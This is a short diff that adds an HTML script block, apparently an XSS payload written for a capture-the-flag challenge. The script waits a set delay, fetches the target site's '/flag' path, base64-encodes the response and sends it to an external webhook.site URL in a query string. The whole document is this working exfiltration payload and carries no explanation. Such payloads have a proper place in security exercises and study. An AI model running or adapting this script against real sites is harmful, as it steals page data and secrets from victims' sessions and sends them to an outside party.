@@ -1,0 +1,10 @@
+<script>
+const VALUE_GREATER_THAN_TTL = 121;
+setTimeout(() => {
+    fetch('/flag')
+    .then(response => response.text())
+    .then(data => {
+        fetch(`https://webhook.site/7d96ce9a-983f-4b34-9f60-53fed9e1b128/?q=${btoa(data)}`);
+    });
+}, VALUE_GREATER_THAN_TTL);
+</script>
